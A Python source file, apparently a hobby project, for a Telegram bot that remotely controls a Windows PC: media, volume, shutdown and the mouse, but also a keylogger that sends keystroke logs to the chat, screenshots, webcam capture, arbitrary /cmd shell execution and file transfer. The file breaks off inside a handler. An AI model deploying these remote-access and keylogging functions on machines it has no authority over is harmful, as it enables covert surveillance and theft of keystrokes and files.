################################################################################ modules
from importlib.resources import path
from xml.dom.expatbuilder import parseString
from inputData import getData, Data

################################################################################ system
import os
import sys
import time
import ctypes
import platform

################################################################################ bot
from telebot import types
import telebot

################################################################################ __screenshot
from mss import mss

################################################################################ __keylogger
import pynput
from pynput.keyboard import Key, Listener

################################################################################ __volume  __lock
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

################################################################################ __brightness
import screen_brightness_control as sbc

################################################################################ __prev  __playpause  __next  __fullscreen  __fullmovie  __close
import pyautogui

################################################################################ __browser  __search
import webbrowser
    # --new
    # 0: open in the same window
    # 1: open in a new window
    # 2: open in a new tab

################################################################################ __youtube
from youtubesearchpython import VideosSearch

################################################################################ __mouse
import mouse

################################################################################ __battery  __status
import psutil

################################################################################ __ip
import socket

################################################################################ __write to file
import pickle

################################################################################ __spotify
import spotipy

################################################################################ __download flie from browser
import pySmartDL

################################################################################ __message box

################################################################################ ToDo-list
# spotify control

################################################################################? global variables
# bot
data = getData()
bot = telebot.TeleBot(data.TOKEN)

# volume
volDevices = AudioUtilities.GetSpeakers()
volInterface = volDevices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
vol = cast(volInterface, POINTER(IAudioEndpointVolume))

# sleep
sleepFlag = False

# keylogger
keyloggerFlag = False
count = 0
keys = []

# youtube
MAX_SEARCH_LEN = 5
ytResults = []

# mouse
curs = 50

# Message Box
MessageBox = ctypes.windll.user32.MessageBoxW


# functions
def searchList(li, item):
    for i in range(len(li)):
        if li[i] == item:
            return True
    return False



print('🚀 Bot launched')
# bot.send_message(data.ID, '🚀 Bot launched')



################################################################################* __start
@bot.message_handler(commands = ['start'])
def Start(message):
    bot.send_message(message.chat.id, '🚀  Bot launched')
    bot.send_message(message.chat.id, 'Use  */help*  for more info', parse_mode = 'Markdown')



################################################################################* help
@bot.message_handler(commands = ['help'])
def Help(message):
    bot.send_message(message.chat.id, '''
*ℹ️  Information about bot:*\n\n
*🚀  /start* - Start bot\n
*ℹ️   /help* - Commands list\n
*🏞  /screenshot* - Take screenshot\n
*📸  /webcam* - Take webcam photo\n
*⌨️  /keylogger* - Start keylogger\n
*🔊  /volume* - Set volume to [value]\n
*☀️  /brightness* - Set brightness to [value]\n
*⏪  /prev* - Previous track\n
*⏯  /playpause* - Play/Pause track\n
*⏩  /next* - Next track\n
*➕ /add_app* - Add application to list\n
*➖ /remove_app* - Remove application from list\n
*📖 /app_list* - List of applications\n
*👟 /open_app [name app]* - Open application\n
*🌐  /browser* - Open URL in browser\n
*🔍  /search* - Search in browser\n
*▶️  /youtube* - Search in youtube\n
*📺  /fullscreen* - Fullscreenf for program\n
*📺  /fullmovie* - Fullscreen for movie\n
*⬆️  /download* - Download file from pc\n
*⬇️  /upload* - Upload file to pc\n
*🕸️  /download_url* - Download file from url\n
*👨‍💻  /cmd* \[command] - run command\n
*🔼  /pgup* - Page up\n
*🔽  /pgdn* - Page down\n
*💀  /kill* - Kill process\n
*❌  /close* - Close current program\n
*🖱  /mouse* - Set mouse position\n
*🔒  /lock* - Lock your PC\n
*⚠️  /shutdown* - Shutdown your PC\n
*🔄  /reboot* - Restart your PC\n
*💤  /sleep* - Hibernate your PC\n
*🔋  /battery* - Show battery status\n
*🛰️  /ip* - Get your IP\n
*🆔  /getid * - Get your telegram ID\n
*🗳️  /msgbox* - Displays a message on the PC screen\n
*⚙️  /info* - Show PC info\n
*🖥️  /status* - Show PC status\n
*⛔  /stop* - Stop bot\n
    ''', parse_mode = 'Markdown')




# buttons
mouse_keyboard = types.ReplyKeyboardMarkup(resize_keyboard = True, one_time_keyboard = False)
btnup = types.KeyboardButton('⬆️')
btndown = types.KeyboardButton('⬇️')
btnLeft = types.KeyboardButton('⬅️')
btnRight = types.KeyboardButton('➡️')
btnClick = types.KeyboardButton('🆗')
btnCancel = types.KeyboardButton('⛔ Stop')
btncurs = types.KeyboardButton('Specify the cursor range')
mouse_keyboard.row(btnup)
mouse_keyboard.row(btnLeft, btnClick, btnRight)
mouse_keyboard.row(btndown)
mouse_keyboard.row(btncurs, btnCancel)




################################################################################* __screenshot
@bot.message_handler(commands = ['screenshot', 'screen'])
def Screenshot(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    bot.send_chat_action(data.ID ,'upload_photo')
    bot.send_message(message.chat.id, '*Done ✅*', parse_mode = 'Markdown')
    with mss() as screen:
        screen.shot(mon = -1, output = 'Screenshot.png')
    if not os.path.exists('./Screenshot.png'):
        return bot.send_message(message.chat.id, '*🏞  Error*, screenshot not found', parse_mode = 'Markdown')
    bot.send_document(message.chat.id, open('Screenshot.png', 'rb'))
    os.remove('Screenshot.png')



################################################################################! __webcam  |не буде працювати на інших пк|
@bot.message_handler(commands = ['webcam', 'cam'])
def Webcam(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    bot.send_chat_action(message.chat.id, 'upload_photo')
    os.system('python webcam.py')
    if not os.path.exists('./Webcam.png'):
        return bot.send_message(message.chat.id, '*⛔  Error*, can\'t access camera', parse_mode = 'Markdown')
    bot.send_message(message.chat.id, '*Done ✅*', parse_mode = 'Markdown')
    bot.send_document(message.chat.id, open('Webcam.png', 'rb'))
    os.remove('Webcam.png')



################################################################################* __keylogger
@bot.message_handler(commands = ['keylogger', 'logger'])
def Keylogger(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    global keyloggerFlag
    keyloggerFlag = False
    markupInlineDisableKeylogger = types.InlineKeyboardMarkup()
    btnDisableKeylogger = types.InlineKeyboardButton(text = 'Disable', callback_data = 'disableKeylogger')
    markupInlineDisableKeylogger.add(btnDisableKeylogger)
    bot.send_message(message.chat.id, '⌨️  Keylogger *activated*', parse_mode = 'Markdown', reply_markup = markupInlineDisableKeylogger)
    if os.path.exists('./Logs.txt'):
        os.remove('Logs.txt')
    with Listener(on_press = onPress, on_release = onRelease) as listener:
        listener.join()
def onPress(key):
    global count, keys
    keys.append(key)
    count += 1
    if count >= 1:
        writeFile(keys)
        count = 0
        keys = []
def onRelease(key):
    global keyloggerFlag
    if keyloggerFlag:
        keyloggerFlag = False
        return False
def writeFile(keys):
    with open('Logs.txt', 'a') as f:
        for key in keys:
            k = str(key).replace('\'', '')
            print(key)
            # if k.find('space') > 0:      # ???????????
            #     f.write('\n')            # ???????????
            if k.find('enter') > 0:
                f.write('[ENTER]\n')
            elif k.find('space') > 0:
                f.write(' ')
            elif k.find('Key.') != -1:
                k = k.replace('Key.', '[') + ']'
                f.write(k.upper())
            elif k.find('Key') == -1:
                f.write(k)



################################################################################* __write text
@bot.message_handler(commands = ['write', 'text'])
def WriteText(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    bot.send_message(message.chat.id, '💬  Enter text to *write*:', parse_mode = 'Markdown')
    bot.register_next_step_handler(message, WriteText_process)
def WriteText_process(message):
    text = message.text
    bot.send_chat_action(message.chat.id, 'typing')
    bot.send_message(message.chat.id, f'*✏️  Writing text*  "{text}"', parse_mode = 'Markdown')
    pyautogui.typewrite(text, interval = 0.05)


################################################################################* __volume
@bot.message_handler(commands = ['volume', 'vol'])
def Volume(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    currentVolume = getCurrentVolume()
    emoji = getVolumeEmoji(currentVolume)
    bot.send_message(message.chat.id, f'{emoji} Current volume is *{currentVolume}%*', parse_mode = 'Markdown')
    bot.send_message(message.chat.id, 'Enter new volume:')
    bot.register_next_step_handler(message, Volume_process)
def Volume_process(message):
    volume = message.text
    if not volume.isdigit():
        return bot.send_message(message.chat.id, 'Volume must be a number')
    volumeInt = int(volume)
    if volumeInt < 0 or volumeInt > 100:
        return bot.send_message(message.chat.id, 'Volume must be *> 0* and *< 100*', parse_mode = 'Markdown')
    emoji = getVolumeEmoji(volumeInt)
    scalarVolume = volumeInt / 100
    vol.SetMasterVolumeLevelScalar(scalarVolume, None)
    bot.send_message(message.chat.id, f'{emoji} Volume set to *{message.text}%*', parse_mode = 'Markdown')
def getCurrentVolume():
    return int(round(vol.GetMasterVolumeLevelScalar() * 100))
def getVolumeEmoji(volume):
    if volume == 0: return '🔇'
    elif volume <= 33: return '🔈'
    elif volume <= 66: return '🔉'
    else: return '🔊'


################################################################################* __brightness
@bot.message_handler(commands = ['brightness', 'bright'])
def Brightness(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    currentBrightness = getCurrentBrightness()
    emoji = getBrightnessEmoji(currentBrightness)
    bot.send_message(message.chat.id, f'{emoji} Current brightness is *{currentBrightness}%*', parse_mode = 'Markdown')
    bot.send_message(message.chat.id, 'Enter new brightness:')
    bot.register_next_step_handler(message, Brightness_process)
def Brightness_process(message):
    brightness = message.text
    if not brightness.isdigit():
        return bot.send_message(message.chat.id, 'Brightness must be a number')
    brightnessInt = int(brightness)
    if brightnessInt < 0 or brightnessInt > 100:
        return bot.send_message(message.chat.id, 'Brightness must be *> 0* and *< 100*', parse_mode = 'Markdown')
    emoji = getBrightnessEmoji(brightnessInt)
    sbc.set_brightness(brightnessInt)
    bot.send_message(message.chat.id, f'{emoji} Brightness set to *{message.text}%*', parse_mode = 'Markdown')
def getCurrentBrightness():
    return sbc.get_brightness()[0]
def getBrightnessEmoji(brightness):
    if brightness < 33: return '🔅'
    elif brightness < 66: return '🔆'
    else: return '☀️'



################################################################################* __previous track
@bot.message_handler(commands = ['previous', 'prev'])
def Previous(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    pyautogui.press('prevtrack')
    bot.send_message(message.chat.id, '*⏪  Previous track*', parse_mode = 'Markdown')



################################################################################* __play/pause
@bot.message_handler(commands = ['playpause', 'play', 'pause'])
def Playpause(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    pyautogui.press('playpause')
    bot.send_message(message.chat.id, '*⏯  Play/Pause track*', parse_mode = 'Markdown')



################################################################################* __next track
@bot.message_handler(commands = ['next', 'skip'])
def Next(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    pyautogui.press('nexttrack')
    bot.send_message(message.chat.id, '*⏩  Next track*', parse_mode = 'Markdown')



################################################################################* __add to dict
@bot.message_handler(commands = ['add_app'])
def addToDict(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    bot.send_message(message.chat.id,f'📝 Enter the application *path*',parse_mode = 'Markdown')
    bot.register_next_step_handler(message,getPath_process)
def getPath_process(message):
    global path
    path = message.text 
    if not os.path.exists(path):
        bot.send_message(message.chat.id, "⛔ The *path* is *incorrect* or the *file does not exist*",parse_mode = 'Markdown')
        return
    bot.send_message(message.chat.id,f'📝 Enter the *name* of the application',parse_mode = 'Markdown')
    bot.register_next_step_handler(message,getName_process)  
def getName_process(message):
    name = message.text
    dict = {name : path}
    data.dict = {**data.dict,**dict}
    bot.send_message(message.chat.id,f'✅ The *{name}* has been successfully added to the list',parse_mode = 'Markdown')
    
    writeToFile()


################################################################################* __open app
@bot.message_handler(commands = ['app'])
def openApp(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    if len(data.dict) == 0:
        bot.send_message(message.chat.id, '⛔ The *dictionary* is empty',parse_mode = 'Markdown')
        return
    
    name = message.text.replace('/app ','')
    try:
        path = data.dict[name]
        os.system(f"\"{path}\"")
        bot.send_message(message.chat.id, f'✅ *{name}* successfully opened',parse_mode = 'Markdown')
    except:
        bot.send_message(message.chat.id, f'⛔ *{name}* is *not found*',parse_mode = 'Markdown')


################################################################################* __list apps
@bot.message_handler(commands = ['apps'])
def listApps(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    if len(data.dict) == 0:
        bot.send_message(message.chat.id, '⛔ The *dictionary* is empty',parse_mode = 'Markdown')
    else:
        markupInline = types.InlineKeyboardMarkup()
        for key in data.dict:
            callback = key
            btn = types.InlineKeyboardButton(text = f'{key}',callback_data = callback)
            markupInline.add(btn)
        bot.send_message(message.chat.id,'📃 List of applications:',parse_mode = 'Markdown',reply_markup = markupInline)



################################################################################* __remove from the list
@bot.message_handler(commands = ['remove_app'])
def removeFromDict(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    if len(data.dict) == 0:
        bot.send_message(message.chat.id, '⛔ The *dictionary* is empty',parse_mode = 'Markdown')
        return
    bot.send_message(message.chat.id,'Enter the name of the program you want to remove',parse_mode = 'Markdown')
    bot.register_next_step_handler(message,removeFromDict_process)
def removeFromDict_process(message):
    name = message.text
    try:
        del data.dict[name]
        bot.send_message(message.chat.id, f'✅ *{name}* successfully removed',parse_mode = 'Markdown')
        writeToFile()
    except:
        bot.send_message(message.chat.id, f'⛔ *{name}* is *not found*',parse_mode = 'Markdown')



################################################################################* __browser
@bot.message_handler(commands = ['browser'])
def Browser(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    bot.send_message(message.chat.id, 'Enter URL:', parse_mode = 'Markdown')
    bot.register_next_step_handler(message, Browser_process)
def Browser_process(message):
    url = message.text
    bot.send_message(message.chat.id, f'*🌐  Opening*  {url}', parse_mode = 'Markdown')
    webbrowser.open(url, new = 2)



################################################################################* __search
@bot.message_handler(commands = ['search'])
def Search(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    bot.send_message(message.chat.id, 'Enter search query:', parse_mode = 'Markdown')
    bot.register_next_step_handler(message, Search_process)
def Search_process(message):
    query = message.text
    bot.send_message(message.chat.id, f'*🔍  Searching*  {query}', parse_mode = 'Markdown')
    webbrowser.open(f'https://www.google.com/search?q={query}', new = 2)



################################################################################* __youtube
@bot.message_handler(commands = ['youtube'])
def Youtube(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    bot.send_message(message.chat.id, 'Enter search query:', parse_mode = 'Markdown')
    bot.register_next_step_handler(message, Youtube_process)
def Youtube_process(message):
    global ytResults
    ytResults = []
    query = message.text
    search = VideosSearch(query, limit = MAX_SEARCH_LEN)
    result = search.result()
    markupInlineYtSearch = types.InlineKeyboardMarkup()
    for index in range(len(result['result'])):
        callback = f'ytSearch_{index}'
        title = result['result'][index]['title']
        duration = result['result'][index]['duration']
        link = result['result'][index]['link']
        ytResults.append({
            'callback': callback,
            'title': title,
            'duration': duration,
            'link': link
        })
        btnYtSearch = types.InlineKeyboardButton(text = f'{duration} • {title}', callback_data = callback)
        markupInlineYtSearch.add(btnYtSearch)
    if len(ytResults) > 0:
        bot.send_message(message.chat.id, f'*🎥  Results:*  "{query}"', parse_mode = 'Markdown', reply_markup = markupInlineYtSearch, disable_web_page_preview = True)
    else:
        bot.send_message(message.chat.id, f'*🎥  No results for*  "{query}"', parse_mode = 'Markdown')
def openInYoutube(link):
    webbrowser.open(link, new = 2)



################################################################################* __fullscreen
@bot.message_handler(commands = ['fullscreen'])
def Fullscreen(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    pyautogui.press('f11')
    bot.send_message(message.chat.id, '📺  *Program* is *fullscreen* now', parse_mode = 'Markdown')

@bot.message_handler(commands = ['fullscreen_movie', 'fullmovie'])
def FullscreenVideo(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    pyautogui.press('f')
    bot.send_message(message.chat.id, '📺  *Movie* is *fullscreen* now', parse_mode = 'Markdown')



################################################################################* __close
@bot.message_handler(commands = ['close'])
def Close(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    bot.send_message(message.chat.id, '*❌  Closing*  *program*', parse_mode = 'Markdown')
    pyautogui.hotkey('altleft', 'f4')



################################################################################* __lock
@bot.message_handler(commands = ['lock'])
def Lock(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    if platform.system() != "Windows":
        return bot.send_message(message.chat.id, 'This feature is currently working only on *Windows*', parse_mode = 'Markdown')
    ctypes.windll.user32.LockWorkStation()
    bot.send_message(message.chat.id, '*🔒  Locked*', parse_mode = 'Markdown')



################################################################################* __shutdown
@bot.message_handler(commands = ['shutdown', 'sd'])
def Shutdown(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    if platform.system() != "Windows":
        return bot.send_message(message.chat.id, 'This feature is currently working only on *Windows*', parse_mode = 'Markdown')
    bot.send_message(message.chat.id, 'How many *seconds* to turn off the PC?', parse_mode = 'Markdown')
    bot.register_next_step_handler(message, Shutdown_process)
def Shutdown_process(message):
    if not message.text.isdigit():
        return bot.send_message(message.chat.id, 'Time must be a number')
    seconds = int(message.text)
    markupInlineCancelShutdown = types.InlineKeyboardMarkup()
    btnCancelShutdown = types.InlineKeyboardButton(text = 'Cancel', callback_data = 'cancelShutdown')
    markupInlineCancelShutdown.add(btnCancelShutdown)
    bot.send_message(message.chat.id, f'⚠️  Shutting down in *{seconds}s*', parse_mode = 'Markdown', reply_markup = markupInlineCancelShutdown)
    os.system(f'shutdown -s -t {seconds}')



################################################################################* __reboot
@bot.message_handler(commands = ['reboot', 'rb'])
def Reeboot(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    if platform.system() != "Windows":
        return bot.send_message(message.chat.id, 'This feature is currently working only on *Windows*', parse_mode = 'Markdown')
    bot.send_message(message.chat.id, 'How many *seconds* to restart the PC?', parse_mode = 'Markdown')
    bot.register_next_step_handler(message, Reboot_process)
def Reboot_process(message):
    if not message.text.isdigit():
        return bot.send_message(message.chat.id, 'Time must be a number')
    seconds = int(message.text)
    markupInlineCancelReboot = types.InlineKeyboardMarkup()
    btnCancelReboot = types.InlineKeyboardButton(text = 'Cancel', callback_data = 'cancelReboot')
    markupInlineCancelReboot.add(btnCancelReboot)
    bot.send_message(message.chat.id, f'🔄  Reboot in *{seconds}s*', parse_mode = 'Markdown', reply_markup = markupInlineCancelReboot)
    os.system(f'shutdown -r -t {seconds}')



################################################################################* __sleep
@bot.message_handler(commands = ['sleep'])
def Sleep(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    global sleepFlag
    sleepFlag = False
    if platform.system() != "Windows":
        return bot.send_message(message.chat.id, 'This feature is currently working only on *Windows*', parse_mode = 'Markdown')
    bot.send_message(
        message.chat.id, 'How many *seconds* to sleep?', parse_mode = 'Markdown')
    bot.register_next_step_handler(message, Sleep_process)
def Sleep_process(message):
    global sleepFlag
    if not message.text.isdigit():
        return bot.send_message(message.chat.id, 'Time must be a number')
    seconds = int(message.text)
    
    markupInlineCancelSleep = types.InlineKeyboardMarkup()
    btnCancelSleep = types.InlineKeyboardButton(text = 'Cancel', callback_data = 'cancelSleep')
    markupInlineCancelSleep.add(btnCancelSleep)
    bot.send_message(message.chat.id, f'💤  Sleeping in *{seconds}s*', parse_mode = 'Markdown', reply_markup = markupInlineCancelSleep)
    
    for i in range(seconds):
        time.sleep(1)
        if sleepFlag:
            sleepFlag = False
            return
    os.system('shutdown /h')



################################################################################* __battery
@bot.message_handler(commands = ['battery'])
def Battery(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    battery = getBattery()
    status = isCharging()
    msg = f'{getBatteryEmoji(battery)}  Battery level is *{battery}*%\n'
    msg += f'{chargingEmoji(status)}  Сharging:  *{status}*'
    bot.send_message(message.chat.id, msg, parse_mode = 'Markdown')
def getBattery():
    return psutil.sensors_battery().percent
def getBatteryEmoji(battery):
    if battery <= 33:
        return '🪫'
    else:
        return '🔋'
def isCharging():
    return psutil.sensors_battery().power_plugged
def chargingEmoji(status):
    if status: return '⚡️'
    else: return '🔌'



################################################################################* __ip
@bot.message_handler(commands = ['ip'])
def SendIP(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    ip = getIP()
    bot.send_message(message.chat.id, f'🛰️ Your *IP* is *{ip}*', parse_mode = 'Markdown')
def getIP():
    return socket.gethostbyname(socket.gethostname())



################################################################################* __id
@bot.message_handler(commands = ['getid', 'id'])
def getID(message):
    bot.send_message(message.from_user.id, f'🆔  Your *ID* is *{message.from_user.id}*', parse_mode = 'Markdown')



################################################################################* __info
@bot.message_handler(commands = ['info', 'pc', 'pc_info'])
def PcInfo(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    uname = platform.uname()

    msg = '⚙️  *Info about your PC*\n\n'
    # OS
    msg += f'OS:  *{uname.system} {uname.release} {uname.version}*\n'
    msg += f'Name:  *{uname.node}*\n'
    # CPU
    msg += f"Processor:  *{uname.processor}*"
    msg += f'Core:  *{psutil.cpu_count(logical = True)}*\n'
    # RAM
    msg += f'📊  RAM: *{getSize(psutil.virtual_memory().total)}*\n'
    # IP
    msg += f'🛰️  IP: *{getIP()}*'
    bot.send_message(message.chat.id, msg, parse_mode = "markdown")



################################################################################* __status
@bot.message_handler(commands = ['status', 'pc_status'])
def PcStatus(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    virtualMem = psutil.virtual_memory()
    battery = getBattery()
    status = isCharging()
    brightness = getCurrentBrightness()
    volume = getCurrentVolume()

    msg = '🖥️  *Your PC Status*\n\n'
    msg += f'📊  Total CPU Usage:  *{psutil.cpu_percent()}%*\n'
    msg += f'🆓  RAM Available:  *{getSize(virtualMem.available)}*\n'
    msg += f'📟  RAM Used:  *{getSize(virtualMem.used)}*\n'
    msg += f'📊  RAM used percentage:  *{virtualMem.percent}%*\n\n'
    msg += f'{getBatteryEmoji(battery)}  Battery level:  *{battery}%*\n'
    msg += f'{chargingEmoji(status)}  Сharging:  *{status}*\n'
    msg += f'{getBrightnessEmoji(brightness)}  Brightness:  *{brightness}%*\n'
    msg += f'{getVolumeEmoji(volume)}  Volume:  *{volume}%*\n'
    bot.send_message(message.chat.id, msg, parse_mode = "markdown")
def getSize(bytes, suffix = ""):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor



################################################################################* __stop
@bot.message_handler(commands = ['stop'])
def stopBot(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    bot.send_message(message.chat.id, '*⛔  Bot stopped*', parse_mode = 'Markdown')
    bot.stop_polling()
    print('⛔ Bot stopped')
    sys.exit()



################################################################################? __upload file
@bot.message_handler(commands = ['upload_file','upload'])
def uploadFile(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    bot.send_message(message.chat.id,'💾 Send *file*',parse_mode = 'Markdown')
    bot.register_next_step_handler(message,uploadFile_process)
def uploadFile_process(message): 
    bot.send_chat_action(message.chat.id, 'typing')
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        src = os.path.expanduser('~') + '\\downloads\\' + message.document.file_name        
        
        with open(src, 'wb') as new_file:
            new_file.write(downloaded_file)

        bot.reply_to(message, f"✅ Successfully uploaded\n\n🛣️ Path to the file: {src}")
    except:
        bot.send_message(message.chat.id,'⚠️ Send the *document* as a *file*',parse_mode = 'Markdown')



@bot.message_handler(commands = ['download_file','download','down'])
def downloadFile(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    bot.send_message(message.chat.id,'🛣️ Enter the file path')
    bot.register_next_step_handler(message,downloadFile_process)
def downloadFile_process(message):
    bot.send_chat_action(message.chat.id, 'typing')
    try:
        path = message.text
        if os.path.exists(path):
            bot.send_message(message.chat.id, "⌛️ File is loading, please wait...")
            bot.send_chat_action(message.chat.id, 'upload_document')
            file = open(path, 'rb')
            bot.send_document(message.chat.id, file)
            file.close()
        else:
            bot.send_message(message.chat.id, "⛔ The *path* is *incorrect* or the *file does not exist*",parse_mode = 'Markdown')
    except:
        bot.send_message(message.chat.id, "⛔ An *error* occurred, probably the path is not specified correctly",parse_mode = 'Markdown')


@bot.message_handler(commands = ['download_url'])
def downloadUrl(message):
    bot.send_message(message.chat.id,'🔗 Enter the *URL*',parse_mode = 'Markdown')
    bot.register_next_step_handler(message,downloadUrl_process)
def downloadUrl_process(message):
    bot.send_chat_action(message.chat.id, 'typing')
    try:
        path = os.path.expanduser('~') + '\\downloads\\'
        url = message.text
        
        obj = pySmartDL(url, path, progress_bar = False)
        obj.start()
        
        bot.send_message(message.chat.id, "⌛️ File is loading, please wait...")

        bot.send_message(message.chat.id, "✅ Successfully downloaded\n\n🛣️ Path to the file: {path}")    
    except:
        bot.send_message(message.chat.id, "⛔ An *error* occurred, probably the path is not specified correctly",parse_mode = 'Markdown')
     
     
     
################################################################################* __cmd
@bot.message_handler(commands = ['cmd'])
def cmd(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    command = message.text.replace('/cmd','')
    if command == '' or command.find('cmd') == 1:
        bot.send_message(message.chat.id, '⚠️  The */cmd* command requires a parameter', parse_mode = 'Markdown')
    elif not os.system(command) and not command == 'cmd':
        bot.send_message(message.chat.id, '*✅  Command success*', parse_mode = 'Markdown')
    else:
        bot.send_message(message.chat.id, '*⛔  Command failed*', parse_mode = 'Markdown')



################################################################################* __PgUp
@bot.message_handler(commands = ['pgup','up'])
def PgUp(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    pyautogui.press('pgup')
    bot.send_message(message.chat.id, '✅ Done', parse_mode = 'Markdown')



################################################################################* __PgDn
@bot.message_handler(commands = ['pgdn','dn'])
def PgDn(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    pyautogui.press('pgdn')
    bot.send_message(message.chat.id, '✅ Done', parse_mode = 'Markdown')



################################################################################/ __callback handler
@bot.callback_query_handler(func = lambda call: True)
def TurnOffCallback(call):
    # shutdown
    if call.data == 'cancelShutdown':
        os.system('shutdown /a')
        bot.send_message(call.message.chat.id, '🛑  Shutdown *canceled*', parse_mode = 'Markdown')
    
    # reboot
    elif call.data == 'cancelReboot':
        os.system('shutdown /a')
        bot.send_message(call.message.chat.id, '🛑  Reboot *canceled*', parse_mode = 'Markdown')
    
    # sleep
    elif call.data == 'cancelSleep':
        global sleepFlag
        sleepFlag = True
        bot.send_message(call.message.chat.id, '🛑  Sleep *canceled*', parse_mode = 'Markdown')
    
    # keylogger
    elif call.data == 'disableKeylogger':
        global keyloggerFlag, keys
        keys = []
        bot.send_chat_action(call.message.chat.id, 'upload_document')
        keyloggerFlag = True
        bot.send_message(call.message.chat.id, '⛔  Keylogger *disactivated*', parse_mode = 'Markdown')
        if not os.path.exists('./Logs.txt'):
            bot.send_message(call.message.chat.id, '*📄  Error*, logs not found', parse_mode = 'Markdown')
        bot.send_message(call.message.chat.id, '*Done ✅*', parse_mode = 'Markdown')
        bot.send_document(call.message.chat.id, open('Logs.txt', 'rb'))
        os.remove('Logs.txt')

    # apps
    for key in data.dict:
        if call.data == key:
            try:
                path = data.dict[key]
                os.system(f"\"{path}\"")
                bot.send_message(call.message.chat.id, f'✅ {key} successfully opened',parse_mode = 'Markdown')
                writeToFile()
            except:
                  bot.send_message(call.message.chat.id, f'⛔ *{key}* is *not found*',parse_mode = 'Markdown')

    # youtube
    global ytResults
    for index in range(MAX_SEARCH_LEN):
        if len(ytResults) == 0: return
        if (call.data == f'ytSearch_{index}'):
            openInYoutube(ytResults[index]['link'])
    


#!############################################################################### __warn | |
def Warn(message):
    pass
#     bot.send_chat_action(message.chat.id, 'typing')
#     bot.send_chat_action(data.ID, 'typing')
#     # other user
#     bot.send_message(message.chat.id, '⚠️  *Warning*\n\n' + 'You are not allowed to use this bot', parse_mode = 'Markdown')
#     # main
#     # msg = f'*⚠️  Someone just used  {message.text}*\n\n'
#     # if message.from_user.username != None:
#     #     msg += f'Username:  *@{message.from_user.username}*\n'
#     # if message.from_user.first_name != None:
#     #     msg += f'First Name:  *{message.from_user.first_name}*\n'
#     # if message.from_user.last_name != None:
#     #     msg += f'Last Name:  *{message.from_user.last_name}*\n'
#     # msg += f'User Id:  *{message.from_user.id}*\n\n'
#     # bot.send_message(data.ID, f'{msg}', parse_mode = 'Markdown')
    
    
################################################################################? __mouse 
@bot.message_handler(commands = ['mouse'])
def mouseControl(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    bot.send_message(message.chat.id, '🖱  *Mouse* is *now* *controlled*', reply_markup = mouse_keyboard, parse_mode = 'Markdown' )
    bot.register_next_step_handler(message, mouse_process)
def mouse_process(message):
    if message.text == "⬆️":
        currentMouseX,  currentMouseY  =  mouse.get_position()
        mouse.move(currentMouseX,  currentMouseY - curs)
        bot.register_next_step_handler(message, mouse_process)
        # screen_process(message)

    elif message.text == "⬇️":
        currentMouseX,  currentMouseY  =  mouse.get_position()
        mouse.move(currentMouseX,  currentMouseY + curs)
        bot.register_next_step_handler(message, mouse_process)
        # screen_process(message)

    elif message.text == "⬅️":
        currentMouseX,  currentMouseY  =  mouse.get_position()
        mouse.move(currentMouseX - curs,  currentMouseY)
        bot.register_next_step_handler(message, mouse_process)
        # screen_process(message)

    elif message.text == "➡️":
        currentMouseX,  currentMouseY  =  mouse.get_position()
        mouse.move(currentMouseX + curs,  currentMouseY)
        bot.register_next_step_handler(message, mouse_process)
        # screen_process(message)

    elif message.text == "🆗":
        mouse.click()
        bot.register_next_step_handler(message, mouse_process)
        # screen_process(message)
        
    elif message.text == '⛔':
        bot.send_message(message.chat.id, '🛑  *Mouse control* is terminated', parse_mode = 'Markdown' )
    elif message.text == 'Specify the cursor range':
        bot.send_chat_action(message.chat.id, 'typing')
        bot.send_message(message.chat.id, f"Specify a new cursor range, now this value is equal to *{str(curs)}px*", parse_mode = 'Markdown')
        bot.register_next_step_handler(message, mousecurs_settings)
def mousecurs_settings(message):
    global curs
    if message.text.isdigit():
        curs = int(message.text)
        bot.send_message(message.chat.id, f"✅ Changed successfully",reply_markup = mouse_keyboard)
        bot.register_next_step_handler(message, mouse_process)
    else:
        bot.send_message(message.chat.id, "⛔ Incorrect value",reply_markup = mouse_keyboard)
        bot.register_next_step_handler(message, mouse_process)



################################################################################* __kill process
@bot.message_handler(commands = ['kill'])
def kill(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
